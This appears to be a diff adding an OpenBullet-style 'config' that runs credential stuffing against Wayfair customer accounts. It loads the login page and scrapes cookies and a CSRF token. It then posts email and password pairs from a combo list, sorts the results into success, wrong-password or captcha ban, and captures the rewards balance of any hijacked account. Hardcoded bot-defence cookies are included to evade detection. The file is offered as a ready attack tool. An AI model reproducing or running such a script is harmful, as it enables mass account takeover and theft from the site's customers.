@@ -1,0 +1,114 @@
+[SETTINGS]
+{
+  "Name": "Wayfair",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-22T11:16:07.0272168-07:00",
+  "AdditionalInfo": "",
+  "Author": "Btc#9999",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Made_By_Btc#9999_ REQUEST GET "https://www.wayfair.com/v/account/authentication/login?url=https%3A%2F%2Fwww.wayfair.com%2F&tl=tb" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<COOKIES(_pxhd)>" LR "" "" -> VAR "px" 
+
+PARSE "<COOKIES(WFSID)>" LR "" "" -> VAR "1" 
+
+PARSE "<COOKIES(CSNUtId)>" LR "" "" -> VAR "2" 
+
+PARSE "<COOKIES(vid)>" LR "" "" -> VAR "3" 
+
+PARSE "<SOURCE>" LR "\",\"csrfToken\":\"" "\",\"" -> VAR "token" 
+
+REQUEST POST "https://www.wayfair.com/a/account/authentication/login" 
+  CONTENT "{\"_csrf_token\":\"<token>\",\"context\":\"auth_main_page_context\",\"duration\":4852,\"email\":\"<USER>\",\"password\":\"<PASS>\",\"step\":\"password\",\"isFromLoginComponent\":true,\"recaptchaResponse\":null,\"grant_type\":\"PWD\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.wayfair.com" 
+  HEADER "referer: https://www.wayfair.com/v/account/authentication/login?url=https%3A%2F%2Fwww.wayfair.com%2F&tl=tb" 
+  HEADER "x-parent-txid: I/cmXF6ggM2A9wwmVGC4Ag==" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "cookie: CSNUtId=<2>; canary=0; _ga=GA1.2.927654740.1584246474; __ssid=238a75f242baabf045b9c248b2180c6; rskxRunCookie=0; rCookie=dtmnlfuly95slq6l9ry4ek6r1lplv; wflang=eng_US; CSN=CLVW%3D32%26PRVW%3DW000393640%257CW000653225%257CLRO10152%257CW001673615%257CW000602846%257CW001055697%257CRPWN1022%26CSNID%3D%26CSNLV%3D; WFCS=CS7; _pxhd=<px>; _pxvid=58839a31-7bdd-11ea-9c44-33fa5733b827; CSNID=90D9FCEB-83F8-4D35-AC20-F32370DD720D; vid=<3>; <1>; WFDC=PDX; serverUAInfo=%7B%22browser%22%3A%22Google%20Chrome%22%2C%22browserVersion%22%3A81.04044113%2C%22OS%22%3A%22Windows%22%2C%22OSVersion%22%3A%2210%22%2C%22isMobile%22%3Afalse%2C%22isTablet%22%3Afalse%2C%22isTouch%22%3Afalse%7D; featureDetect={\"isTouch\":false,\"hasMQ\":true,\"deviceWidth\":1920,\"deviceHeight\":969,\"devicePixelRatio\":1}; _gid=GA1.2.1361530281.1587577030; AMP_TOKEN=%24NOT_FOUND; _pxff_tm=1; CSNBrief=SLoc%3Dpdx1%26TopNavCSSCachedByBrowser%3Dtrue; hideGoogleYolo=true; dtr=1; lastRskxRun=1587577034669; otx=I%2FcmXF6ggM2A9wwmVGC4Ag%3D%3D; _gat_a=1; _gat_b=1; _px3=cef83d8ff1abbb6a9ddcce5baa059e30aebe253950dbc35c2674813a62340b6b:vM5UsdeNAJSzNdJ6UCNEUhnIu2wJGROmZih/Gv9s7d/PdiQ32TcXXyTW5CUjYkFjI0VZA24400HuHyfZ2sR4GQ==:1000:BDO4dgo9AUtq3Nzjpe/dxg/sSRexSthDlw7Jr674Rtmq/qzTowwVozQZiyIPX1qfEulLCW5Um3so4VjJCeGIZyOBWfMA790qe8bevVYFBu5al98CR7zRDDA8bGU2h/pfzDnl/MhhCFqSCi5lyxcyUeObdw65AAHSI9QkIhWDI2o=; CSNPersist=page_of_visit%3D120%26latestRefid%3DTEM_WF_249" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+PARSE "<COOKIES(CSNADA)>" LR "" "" -> VAR "CSNADA" 
+
+PARSE "<COOKIES(CSNBrief)>" LR "" "" -> VAR "CSNBrief" 
+
+PARSE "<COOKIES(CSNID)>" LR "" "" -> VAR "CSNID" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "account_welcome" 
+  KEYCHAIN Failure OR 
+    KEY "\":{\"wrong_password\":\"The password you entered isn't correct.\"}},\"" 
+  KEYCHAIN Ban OR 
+    KEY "{\"captcha\":1}" 
+
+REQUEST GET "https://www.wayfair.com/v/account/rewards/balance" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "cookie: featureDetect={\"isTouch\":false,\"hasMQ\":true,\"deviceWidth\":1920,\"deviceHeight\":969,\"devicePixelRatio\":1}; CSNUtId=<2>; canary=0; _ga=GA1.2.927654740.1584246474; __ssid=238a75f242baabf045b9c248b2180c6; rskxRunCookie=0; rCookie=dtmnlfuly95slq6l9ry4ek6r1lplv; wflang=eng_US; CSN=CLVW%3D32%26PRVW%3DW000393640%257CW000653225%257CLRO10152%257CW001673615%257CW000602846%257CW001055697%257CRPWN1022%26CSNID%3D%26CSNLV%3D; _pxhd=<px>; _pxvid=58839a31-7bdd-11ea-9c44-33fa5733b827; serverUAInfo=%7B%22browser%22%3A%22Google%20Chrome%22%2C%22browserVersion%22%3A81.04044113%2C%22OS%22%3A%22Windows%22%2C%22OSVersion%22%3A%2210%22%2C%22isMobile%22%3Afalse%2C%22isTablet%22%3Afalse%2C%22isTouch%22%3Afalse%7D; _gid=GA1.2.1361530281.1587577030; AMP_TOKEN=%24NOT_FOUND; hideGoogleYolo=true; dtr=1; lastRskxRun=1587577034669; wfgelfs=js_uncaught_exception%3D0; featureDetect={\"isTouch\":false,\"hasMQ\":true,\"deviceWidth\":602,\"deviceHeight\":969,\"devicePixelRatio\":1}; _pxff_tm=1; hideGoogleYolo=1; vid=23f584c2-5ea0-863d-0af8-0c00535c4502; WFSID=6ae532e792ffb84515317b806b0c54df; CSNID=<CSNID>; WFCS=CS3; WFDC=DSM; CSNBrief=SLoc%3Ddsm1%26TopNavCSSCachedByBrowser%3Dtrue%26DRF%3Diad1; CSNADA=<CSNADA>; _px3=4ef3357c318ebaaf784a8c18df80fc5dad428f99f1362687872dd94a15735f26:NJ2R9ISeXnvKht4XLgmYZPOho4fcLuTdKTOTamEucL8W6Q1MEoMThjcR5sKsHv5CHMh+xqQPQIulHM5piG6WNg==:1000:TLyiXSsQXpCvYwzctbUtyddnZ82pjF3ZjWTvyvU/VbA2Jrkqc7pVGosR+2glUaD/5mZLKKIOWpJlXZTW8a5YAsXvlSj7XTionI0SCSOVZCETlTPu6BmCzBMHZl/PPhAvN6njXV0V4bnaxGUGEx/S7/Lrx5a2W+pUW+QoxqCKfwU=; ibb=1; CSNPersist=page_of_visit%3D140%26latestRefid%3DTEM_WF_249; otx=I%2BF9Ol6ghmjCYAwNKOHZAg%3D%3D" 
+  HEADER "referer: https://www.wayfair.com/v/account/welcome/show?logout=1587578429" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "<!-- -->" "<!-- -->" CreateEmpty=FALSE -> CAP "Balance" 
+
